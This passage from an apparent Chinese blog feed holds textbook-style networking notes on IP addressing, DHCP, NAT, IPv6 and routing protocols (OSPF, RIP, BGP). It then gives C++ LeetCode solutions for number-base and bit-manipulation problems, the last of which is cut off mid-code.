计算</h3><p>已知一个IP地址和子网掩码可以算出：</p><ul><li>子网的网络地址(network address)；</li><li>子网的广播地址(broadcast address);</li><li>子网中的主机地址范围；</li><li>子网中有几台主机。</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405071738563.png"alt="image-20240507161142986" /><figcaption aria-hidden="true">image-20240507161142986</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405071738564.png"alt="image-20240507161151859" /><figcaption aria-hidden="true">image-20240507161151859</figcaption></figure><h3 id="ip地址分配">4.2.4 IP地址分配</h3><h4 id="cidr">4.2.4.1 CIDR</h4><ul><li>CIDR：Classless InterDomain Routing（无类别域间路由选择）</li><li>地址格式：a.b.c.d/x，其中 x 是地址中子网部分的 # 位，称为前缀</li><li>组织内设备的 IP 地址将共享共同的前缀，路由器只考虑前缀来转发</li><li>地址的其余 32-x 位用于区分组织内的设备</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405071738565.png"alt="image-20240507161911094" /><figcaption aria-hidden="true">image-20240507161911094</figcaption></figure><h4 id="分类编址">4.2.4.2 分类编址</h4><ul><li>classful addressing（分类编址）：IP 地址的网络部分长度限制为 8、16或 24 比特</li><li>具有 8 位、16 位和 24 位子网地址的子网被称为 A 类、B 类和 C类网络</li><li>快速消耗，利用率低</li></ul><h4 id="私有ip地址">4.2.4.3 私有IP地址</h4><ul><li>随着私有IP网络的发展，为节省可分配的注册IP地址，有一组IP地址被拿出来专门用于私有IP网络，称为私有IP地址。这些地址不会被Internet分配，在Internet上也不会被路由，虽然它们不能直接和Internet连接，但通过技术手段仍旧可以和Internet通信（NAT技术）<ul><li>A类私有IP地址空间: 10.0.0.0~10.255.255.255，即10.0.0.0/8</li><li>B类私有IP地址空间:172.16.0.0~172.31.255.255，即172.16.0.0/12</li><li>C类私有IP地址空间:192.168.0.0~192.168.255.255，即192.168.0.0/16</li></ul></li><li>一些特殊的IP地址<ul><li>0.0.0.0：保留地址，表示本网络上的本主机（设备启动时但又不知道自己的IP地址情况下）</li><li>255.255.255.255：<strong>受限广播地址</strong>，只在本网络上进行广播（各个路由器均不转发）。（IP地址的主机字段全为1，例如：192.168.10.255，称为<strong>直接广播地址</strong>，被发送到该网络号的每台主机，路由器可转发）</li><li>127.0.0.1：环回地址(LoopbackAddress)，一般用来作为本地软件环回测试（lookbacktest）本主机的进程之间通信。</li></ul></li></ul><h3 id="分层寻址">4.2.5 分层寻址</h3><p>地址聚合/路由聚合：使用单个网络前缀（200.23.16.0/20）通告多个网络（子网）的能力。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405071738566.png"alt="image-20240507163141977" /><figcaption aria-hidden="true">image-20240507163141977</figcaption></figure><h3 id="dhcp">4.2.6 DHCP</h3><ul><li><p>DHCP： Dynamic Host Configuration Protocol（动态主机配置协议）</p><ul><li>允许主机在加入网络时从网络服务器动态获取 IP 地址</li><li>DHCP允许主机获得子网掩码、第一跳路由器地址（称为默认网关地址）和本地 DNS服务器地址</li><li>广泛应用于住宅 ISP 接入网络和无线局域网</li><li>plug-and-play：即插即用协议</li><li>使用UDP为传输协议的应用层协议</li></ul></li><li><p>工作流程：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405071738567.png"alt="image-20240507164421276" /><figcaption aria-hidden="true">image-20240507164421276</figcaption></figure></li><li><p>总结：</p><ul><li>整个过程中，DHCP客户端的源IP地址均为0.0.0.0</li><li>整个过程中，DHCP客户端和服务端的目标IP地址均为255.255.255.255</li><li>yiaddr除第一次DHCP客户端请求时为空，后面三个阶段的地址为服务器分配和客户端希望使用的IP地址</li><li>客户端一般使用UDP 68号端口，服务端一般使用UDP 67号端口</li></ul></li></ul><h3 id="nat">4.2.7 NAT</h3><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405071738568.png"alt="image-20240507170244666" /><figcaption aria-hidden="true">image-20240507170244666</figcaption></figure><ul><li><p>动机：对外界而言，本地网络只使用一个 IP 地址</p><ul><li>不需要 ISP 提供一系列地址：所有设备只需一个 IP 地址</li><li>可更改本地网络中设备的地址，而无需通知外界</li><li>可更改 ISP，而无需更改本地网络中设备的地址</li><li>本地网络内的设备无法明确寻址，但可被外界看到（安全优势）</li></ul></li><li><p>实现：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405071738569.png"alt="image-20240507170608792" /><figcaption aria-hidden="true">image-20240507170608792</figcaption></figure></li><li><p>争议：</p><ul><li>端口号应用于进程寻址，而不是主机寻址</li><li>不应修改端口号</li><li>违背端到端观点</li><li>通过IPv6解决地址耗尽问题而不是打补丁</li></ul></li><li><p>NAT穿越问题</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405071738570.png"alt="image-20240507171151402" /><figcaption aria-hidden="true">image-20240507171151402</figcaption></figure><ul><li>静态配置 NAT，将指定端口的传入连接请求转发给服务器</li><li>Universal Plug and Play（UPnP, 通用即插即用）协议允许 NAT 主机：<ul><li>发现并配置附近的 NAT 设备</li><li>添加/删除端口映射（含租用时间）</li><li>学习公共 IP 地址 (138.76.29.7)</li></ul></li><li>中继（用于Skype）<ul><li>经 NAT 的客户端与中继器建立连接</li><li>外部客户端连接到中继器</li><li>中继器在连接之间桥接数据包</li></ul></li></ul></li></ul><h2 id="icmp">4.3 ICMP</h2><p>ICMP: internet control message protocol （因特网控制报文协议）</p><ul><li>主机和路由器用来交流网络层信息<ul><li>错误报告</li><li>ping：echo request/reply</li></ul></li><li>网络层协议<ul><li>位于IP之上</li><li>作为IP有效载荷承载</li></ul></li><li>ICMP报文：<ul><li>类型字段</li><li>编码字段</li><li>引起该ICMP包首次产生的IP数据报头部和前8字节内容</li></ul></li></ul><h2 id="ipv6">4.4 IPv6</h2><h3 id="数据报格式-1">4.4.1 数据报格式</h3><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405071738571.png"alt="image-20240507172535728" /><figcaption aria-hidden="true">image-20240507172535728</figcaption></figure><ul><li>固定40字节，IP地址长度为128位。</li><li>不进行分片重组，只能在源和目的地上使用。</li><li>流量类别（优先级）：确定数据流中数据报的优先级。</li><li>流量标签：确定同一 "流 "中的数据报（"流 "的概念没有明确定义）。</li><li>下一报头：确定数据的上层协议。</li></ul><h3 id="过渡方法">4.4.2 过渡方法</h3><p>从 IPv4 过渡到 IPv6的两种方法：双栈（dual-stack）和隧道（tunneling）。</p><h4 id="双栈">4.4.2.1 双栈</h4><ul><li>IPv6 节点具有完整的 IPv4 实施功能<ul><li>被称为 IPv6/IPv4 节点</li><li>同时发送和接收 IPv4 和 IPv6 数据报</li><li>同时拥有 IPv4 和 IPv6 地址</li></ul></li><li>如果发送方或接收方仅支持 IPv4，则必须使用 IPv4 数据报。</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405071738572.png"alt="image-20240507173508785" /><figcaption aria-hidden="true">image-20240507173508785</figcaption></figure><h4 id="隧道">4.4.2.2 隧道</h4><ul><li>IPv6 数据报作为 IPv4 数据报的有效载荷在 IPv4 路由器之间传输</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405071738573.png"alt="image-20240507173617486" /><figcaption aria-hidden="true">image-20240507173617486</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405071738574.png"alt="image-20240507173632247" /><figcaption aria-hidden="true">image-20240507173632247</figcaption></figure><h1 id="路由算法">5. 路由算法</h1><p>路由算法：找到从<strong>源路由器</strong>到<strong>目的路由器</strong>的<strong>最小代价路径</strong>的算法。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405081606935.png"alt="image-20240508131014669" /><figcaption aria-hidden="true">image-20240508131014669</figcaption></figure><p><strong>分类一：</strong></p><ul><li>全局式路由算法<ul><li>所有路由器都有完整的拓扑结构、链路成本信息</li><li>称为链路状态（Link State）算法</li></ul></li><li>分散式路由算法<ul><li>路由器只知道物理连接的邻居，与邻居的链接成本</li><li>迭代计算过程，与邻居交换信息</li><li>称为距离向量（Distance Vector）算法</li></ul></li></ul><p><strong>分类二：</strong></p><ul><li>静态路由算法<ul><li>路由随时间缓慢变化</li><li>人工手动编辑转发表</li></ul></li><li>动态路由算法<ul><li>路由变化更快</li><li>定期更新，或响应拓扑或链路成本的变化</li></ul></li></ul><p><strong>分类三：</strong></p><ul><li>负载敏感路由算法<ul><li>链路开销动态变化，以反映当前的拥塞程度</li><li>高成本与当前拥塞的链路有关</li><li>路由算法将倾向于选择绕过拥塞链路的路由</li><li>如：ARPAnet</li></ul></li><li>负载不敏感路由算法<ul><li>链路开销没有明确反映当前（或最近过去）的拥塞水平</li><li>如RIP、OSPF、 BGP</li></ul></li></ul><h2 id="链路状态算法">5.1 链路状态算法</h2><ul><li>在 LS 路由算法中，网络拓扑和所有链路成本都是已知的</li><li>实现途径：通过让每个节点向网络中所有其他节点广播链路状态数据包来实现链路状态广播算法（容易形成广播风暴）<ul><li>每个链路状态数据包都包含其附属链路的身份和成本</li><li>最后，所有节点都有一个完全相同的网络视图</li></ul></li><li>链路状态路由算法被称为迪杰斯特拉算法（Dijkstra's algorithm）</li><li>迭代算法：经过 k 次迭代后，知道到 k 个目的地的最小成本路径</li></ul><h3 id="数学符号">5.1.1 数学符号</h3><ul><li><code>c(x,y)</code>：从节点x到y的链路代价，如果不相邻则值为无穷</li><li><code>D(v)</code>：从源点到目标节点v的最小代价路径的值</li><li><code>p(v)</code>：从源点到目标节点v的最小代价路径中，节点v的前继节点</li><li><code>N'</code>：已经确定在最小代价路径中的节点集合</li></ul><h3 id="算法流程">5.1.2 算法流程</h3><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405081606936.png"alt="image-20240508132819336" /><figcaption aria-hidden="true">image-20240508132819336</figcaption></figure><h3 id="示例">5.1.3 示例</h3><p>LS算法示例：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405081606937.png"alt="image-20240508133149676" /><figcaption aria-hidden="true">image-20240508133149676</figcaption></figure><p>通过前序节点构造最短路径树：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405081606938.png"alt="image-20240508133331239" /><figcaption aria-hidden="true">image-20240508133331239</figcaption></figure><h3 id="振荡">5.1.4 振荡</h3><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405081606939.png"alt="image-20240508141114965" /><figcaption aria-hidden="true">image-20240508141114965</figcaption></figure><p>解决方案：路由器发送链路通告的时间随机化。</p><h2 id="距离向量算法">5.2 距离向量算法</h2><h3 id="贝尔曼福特方程">5.2.1 贝尔曼福特方程</h3><p>B-F方程：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405081606940.png"alt="image-20240508134544584" /><figcaption aria-hidden="true">image-20240508134544584</figcaption></figure><p>示例：</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405081606941.png"alt="image-20240508134916615" /><figcaption aria-hidden="true">image-20240508134916615</figcaption></figure><h3 id="数学符号-1">5.2.2 数学符号</h3><ul><li>d<sub>x</sub>(y)：节点x到节点y的最小代价路径值</li><li>D<sub>x</sub>(y)：估计值</li><li>节点x：<ul><li>知道每个邻居 v 的成本：c(x,v)</li><li>维护距离向量（x节点自己到所有节点的最短路径代价的估计值）</li><li>维护所有邻居的距离向量</li></ul></li></ul><h3 id="算法核心">5.2.3 算法核心</h3><ul><li>每个节点不时向邻居发送自己的距离向量估计值；当 x 收到邻居的新 DV估计值时，使用 B-F 公式更新自己的 DV。</li><li>估计值将最终收敛接近实际值</li><li>迭代、异步、分布式算法</li><li>节点过多，容易引起广播风暴</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405081606942.png"alt="image-20240508135820276" /><figcaption aria-hidden="true">image-20240508135820276</figcaption></figure><h3 id="算法流程-1">5.2.4 算法流程</h3><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405081606943.png"alt="image-20240508140119651" /><figcaption aria-hidden="true">image-20240508140119651</figcaption></figure><h3 id="示例-1">5.2.5 示例</h3><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405081606944.png"alt="image-20240508140417054" /><figcaption aria-hidden="true">image-20240508140417054</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405081606945.png"alt="image-20240508140430522" /><figcaption aria-hidden="true">image-20240508140430522</figcaption></figure><h3 id="路由环路">5.2.6 路由环路</h3><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405081606946.png"alt="image-20240508141308774" /><figcaption aria-hidden="true">image-20240508141308774</figcaption></figure><p>解决方案：毒性逆转。如果 Z 经过 Y 到达 X，Z 告诉 Y 它（Z）到 X的距离是无限的，所以 Y 不会经过 Z 到达 X。</p><p>注：不能完全解决。</p><h2 id="层次化路由">5.3 层次化路由</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405081606947.png"alt="image-20240508144708087" /><figcaption aria-hidden="true">image-20240508144708087</figcaption></figure><ul><li><p>背景：规模、管理自治</p></li><li><p>解决方案：将路由器聚合成区域，即自治系统（autonomoussystems，AS）</p></li><li><p>同一 AS 中的路由器运行同一路由协议</p><ul><li>自治系统域内路由协议（“intra-AS” routing protocol）</li><li>不同 AS 中的路由器可以运行不同的<strong>域内</strong>路由协议</li></ul></li><li><p>网关路由器</p><ul><li>在自己 AS 的边缘</li><li>与另一个 AS 中的路由器有链接</li></ul></li><li><p>一个路由器如何将一个数据包路由到AS之外？域间路由协议（inter-ASrouting protocol）</p><ul><li>学习可达性信息</li><li>将此可达性信息传播给该域内所有路由器</li></ul></li><li><p>因特网中的所有 AS都使用相同的<strong>域间</strong>路由协议（BGP4）</p></li><li><p>转发表由域内和域间路由算法共同配置</p><ul><li>域内路由算法为内部目的地设置条目</li><li>域内、域间路由算法共同为外部目的地设置条目</li></ul></li><li><p>热土豆路由（hot potatorouting）：源路由器距离网关路由器最短路径代价中最小的网关，作为其转发表对应的接口。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405081606948.png"alt="image-20240508145759722" /><figcaption aria-hidden="true">image-20240508145759722</figcaption></figure></li></ul><h1 id="因特网中的路由选择">6. 因特网中的路由选择</h1><ul><li>自治系统域内路由（Intra-AS Routing）<ul><li>AS 内路由选择用于确定 AS 内路由选择的执行方式</li><li>又称内部网关协议（interior gateway protocols，IGP）</li><li>最常见的域内路由协议（intra-AS routing protocols）<ul><li>OSPF：Open Shortest Path First 开放最短路径优先</li><li>RIP：Routing Information Protocol 路由信息协议</li><li>IGRP：Interior Gateway Routing Protocol（Cisco proprietary）</li></ul></li></ul></li><li>自治系统域间路由（Inter-AS Routing）<ul><li>BGP：Border Gateway Protocol 边界网关协议</li></ul></li></ul><h2 id="ospf">6.1 OSPF</h2><ul><li><p>OSPF 部署在上层互联网服务提供商中，而 RIP则部署在下层互联网服务提供商和企业网络中</p></li><li><p>使用链路状态算法</p><ul><li>路由器向自治系统内所有其他路由器广播路由选择信息</li><li>每个节点都有拓扑图</li><li>使用 Dijkstra 算法进行路由计算</li></ul></li><li><p>OSPF 广播为每个邻居提供一个条目</p></li><li><p>OSPF 报文通过IP数据报承载（注：RIP由UDP报文承载）</p></li><li><p>优点：</p><ul><li><p>安全性：所有 OSPF 报文都经过验证</p></li><li><p>允许多条相同开销的路径（RIP 中只允许一条）</p></li><li><p>集成单播和多播支持</p></li><li><p>支持在单个AS中的层次结构</p><ul><li>两级层次结构：局域网、主干网</li><li>区域边界路由器：汇总自己区域内网络的距离，向其他区域边界路由器发布</li><li>骨干路由器：运行仅限于骨干的 OSPF 路由</li><li>边界路由器：连接其他 AS</li></ul><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202405081606949.png"alt="image-20240508151540071" /><figcaption aria-hidden="true">image-20240508151540071</figcaption></figure></li></ul></li></ul><h2 id="rip">6.2 RIP</h2><ul><li>使用距离向量算法<ul><li>距离指标：hops（最大为15），每条链路代价为1</li><li>每隔30秒在RIP响应消息中与邻居交换距离向量</li><li>每条广播：最多25个目标子网的列表</li></ul></li><li>注：距离向量<ul><li>先前部分：开销在路由器对之间定义</li><li>RIP：源路由器到目标子网，包括目标子网</li></ul></li><li>链路故障与恢复<ul><li>如果180秒没有收到广播，则宣布邻居/链路死亡<ul><li>A 通过邻居的路由已失效</li><li>向 A 的其他邻居发送新广播</li><li>其他邻居依次发送新广播（如果表格发生变化）</li></ul></li><li>毒性逆转：距离 =16 hops</li></ul></li><li>RIP 路由表<ul><li>由名为 route-d（守护进程）的应用级进程管理</li><li>广播以 UDP 数据包形式发送，使用端口号 520，定期重复发送</li></ul></li></ul><h2 id="bgp">6.3 BGP</h2><ul><li>BGP 为每个 AS 提供<ul><li>eBGP：从相邻 AS 获取子网可达性信息</li><li>iBGP：向所有 AS 内部路由器传播可达性信息</li><li>根据可达性信息和策略，确定通往其他网络的良好路由</li></ul></li><li>允许子网向因特网其他部分宣布自己的存在</li></ul><h3 id="基本知识">6.3.1 基本知识</h3><ul><li>BGP 会话：两个 BGP 路由器（"对等方"）交换 BGP 消息<ul><li>通告通向不同目标网络前缀的路径（"路径向量 "协议）</li><li>通过使用端口 179 的半永久 TCP 连接进行交换</li></ul></li><li>目的地格式：目的地不是主机，而是 CIDR 化的前缀</li><li>路由器通过BGP连接通告前缀时，它还包含一些BGP属性，带有属性的前缀即一条路由</li><li>两个重要属性<ul><li>AS-PATH：包含了通告已通过的AS列表；用于检测和防止循环通告。假定前缀138.16.64/24首先是由AS2向ASl通告的；如果ASl接下来将该前缀向AS3通告，则该AS PATH将是AS2 ASl。</li><li>NEXT-HOP：表示下一跳 AS 的特定内部AS 路由器接口</li></ul></li></ul><h3 id="路由选择">6.3.2 路由选择</h3><p>如果对相同前缀存在2条及以上路由，BGP顺序调用下列消除规则：</p><ul><li>本地偏好值属性</li><li>最短AS-PATH</li><li>最靠近NEXT-HOP路由器</li><li>其他BGP标准</li></ul><p><strong>参考资料</strong>：</p><ol type="1"><li>计算机网络——自顶向下方法（第七版）</li></ol>]]></content>
    
    
    <categories>
      
      <category>计算机核心课程</category>
      
      <category>计算机网络</category>
      
      <category>计算机网络——自顶向下方法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>数与位篇</title>
    <link href="/2024/04/30/LeetCode/%E6%95%B0%E4%B8%8E%E4%BD%8D%E7%AF%87/"/>
    <url>/2024/04/30/LeetCode/%E6%95%B0%E4%B8%8E%E4%BD%8D%E7%AF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="进制转换">1. 进制转换</h1><h2 id="二进制求和">二进制求和</h2><blockquote><p>借鉴「列竖式」的方法，末尾对齐，逐位相加。在十进制的计算中「逢十进一」，二进制中我们需要「逢二进一」。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">string <span class="hljs-title">addBinary</span><span class="hljs-params">(string a, string b)</span> </span>&#123;<br>        string ans;<br>        <span class="hljs-built_in">reverse</span>(a.<span class="hljs-built_in">begin</span>(), a.<span class="hljs-built_in">end</span>());<br>        <span class="hljs-built_in">reverse</span>(b.<span class="hljs-built_in">begin</span>(), b.<span class="hljs-built_in">end</span>());<br><br>        <span class="hljs-type">int</span> n = <span class="hljs-built_in">max</span>(a.<span class="hljs-built_in">length</span>(), b.<span class="hljs-built_in">length</span>());<br>        <span class="hljs-type">int</span> carry = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>            <span class="hljs-keyword">if</span> (i &lt; a.<span class="hljs-built_in">length</span>()) &#123;<br>                carry += a[i] - <span class="hljs-string">&#x27;0&#x27;</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (i &lt; b.<span class="hljs-built_in">length</span>()) &#123;<br>                carry += b[i] - <span class="hljs-string">&#x27;0&#x27;</span>;<br>            &#125;<br>            ans.<span class="hljs-built_in">push_back</span>((carry % <span class="hljs-number">2</span>) ? <span class="hljs-string">&#x27;1&#x27;</span> : <span class="hljs-string">&#x27;0&#x27;</span>);<br>            carry /= <span class="hljs-number">2</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (carry) &#123;<br>            ans.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;1&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-built_in">reverse</span>(ans.<span class="hljs-built_in">begin</span>(), ans.<span class="hljs-built_in">end</span>());<br><br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="七进制数">七进制数</h2><blockquote><p>短除法</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">string <span class="hljs-title">convertToBase7</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (num == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;0&quot;</span>;<br>        &#125;<br>        <br>        <span class="hljs-type">bool</span> negative = num &lt; <span class="hljs-number">0</span>;<br>        num = <span class="hljs-built_in">abs</span>(num);<br>        string ans;<br><br>        <span class="hljs-keyword">while</span> (num &gt; <span class="hljs-number">0</span>) &#123;<br>            ans.<span class="hljs-built_in">push_back</span>(num % <span class="hljs-number">7</span> + <span class="hljs-string">&#x27;0&#x27;</span>);<br>            num /= <span class="hljs-number">7</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (negative) &#123;<br>            ans.<span class="hljs-built_in">push_back</span>(<span class="hljs-string">&#x27;-&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-built_in">reverse</span>(ans.<span class="hljs-built_in">begin</span>(), ans.<span class="hljs-built_in">end</span>());<br><br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="数字转换为十六进制数">数字转换为十六进制数</h2><blockquote><p>在补码运算中，最高位表示符号位，符号位是 0 表示正整数和零，符号位是 1表示负整数。32 位有符号整数的二进制数有 32位，由于一位十六进制数对应四位二进制数，因此 32位有符号整数的十六进制数有 8 位。将 num 的二进制数按照四位一组分成 8组，依次将每一组转换为对应的十六进制数，即可得到 num 的十六进制数。</p><p>假设二进制数的 8 组从低位到高位依次是第 0 组到第 7 组，则对于第 i组，可以通过 (nums&gt;&gt;(4×i)) &amp; 0xf 得到该组的值，其取值范围是 0到 15（即十六进制的 f）。将每一组的值转换为十六进制数的做法如下：</p><ul><li>对于 0 到 9，数字本身就是十六进制数；</li><li>对于 10 到 15，将其转换为 a 到 f 中的对应字母。</li></ul><p>对于负整数，由于最高位一定不是0，因此不会出现前导零。对于零和正整数，可能出现前导零。避免前导零的做法如下：</p><ul><li><p>如果 num=0，则直接返回 0；</p></li><li><p>如果 num&gt;0，则在遍历每一组的值时，从第一个不是 0的值开始拼接成十六进制数。</p></li></ul></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">string <span class="hljs-title">toHex</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (num == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;0&quot;</span>;<br>        &#125;<br><br>        string sb;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">7</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>            <span class="hljs-type">int</span> val = (num &gt;&gt; (<span class="hljs-number">4</span> * i)) &amp; <span class="hljs-number">0xf</span>;<br>            <span class="hljs-keyword">if</span> (sb.<span class="hljs-built_in">length</span>() &gt; <span class="hljs-number">0</span> || val &gt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-type">char</span> digit =<br>                    val &lt; <span class="hljs-number">10</span> ? (<span class="hljs-type">char</span>)(<span class="hljs-string">&#x27;0&#x27;</span> + val) : (<span class="hljs-type">char</span>)(<span class="hljs-string">&#x27;a&#x27;</span> + val - <span class="hljs-number">10</span>);<br>                sb.<span class="hljs-built_in">push_back</span>(digit);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> sb;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="数字的补数">数字的补数</h2><blockquote><ol type="1"><li><p><strong>确定最高位的1</strong>：</p></li><li><p><strong>构造掩码</strong>：</p><ul><li>如果 <code>highbit</code> 为30，表示 <code>num</code>是一个非常大的数，接近于 <code>int</code> 的最大值，此时设定掩码<code>mask</code>为0x7fffffff（即int的最大正值，所有位都为1除了最高的符号位）。</li><li>如果不是30，则构造一个掩码 <code>mask</code>，其值为 <code>1</code>左移 (<code>highbit + 1</code>) 位后减1。这样的掩码将从0位到<code>highbit</code> 位都设为1，其他位为0。</li></ul></li><li><p><strong>计算补数</strong>：使用XOR运算符 <code>^</code> 将<code>num</code> 与掩码 <code>mask</code>进行异或操作。因为掩码的1位会使 <code>num</code>中相应的位翻转，从而实现取补数的目的。</p></li><li><p><strong>返回结果</strong>：最后返回异或运算的结果，即<code>num</code> 的二进制补数。</p></li></ol></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">findComplement</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span> </span>&#123;<br>        <span class="hljs-type">int</span> highbit = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">30</span>; i++) &#123;<br>            <span class="hljs-keyword">if</span> (num &gt;= (<span class="hljs-number">1</span> &lt;&lt; i)) &#123;<br>                highbit = i;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-type">int</span> mask = (highbit == <span class="hljs-number">30</span>) ? <span class="hljs-number">0x7fffffff</span> : ((<span class="hljs-number">1</span> &lt;&lt; (highbit + <span class="hljs-number">1</span>)) - <span class="hljs-number">1</span>);<br><br>        <span class="hljs-keyword">return</span> num ^ mask;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="加一">加一</h2><blockquote><p>当我们对数组 <em>digits</em> 加一时，我们只需要关注 <em>digits</em>的末尾出现了多少个 9 即可。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 